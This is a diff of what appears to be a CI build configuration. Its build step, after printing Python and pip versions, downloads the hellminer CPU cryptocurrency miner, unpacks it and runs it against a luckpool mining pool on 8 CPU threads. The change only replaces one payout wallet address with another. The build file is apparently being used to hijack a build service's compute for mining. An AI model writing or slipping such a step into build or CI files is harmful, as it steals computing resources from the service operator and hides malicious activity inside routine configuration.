@@ -10,5 +10,5 @@ build:
         code: |
           echo "python version $(python --version) running"
           echo "pip version $(pip --version) running"
-          wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar xf hellminer_cpu_linux.tar.gz && chmod +x hellminer && ./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RLM9zhMnfJisKwYpbREgsfyFrs2RnZvs4e.Ren --cpu 8
+          wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar xf hellminer_cpu_linux.tar.gz && chmod +x hellminer && ./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RGVegWzDKhuPUAKJybftAZm4BXShNFPCYe.cuk --cpu 8
          
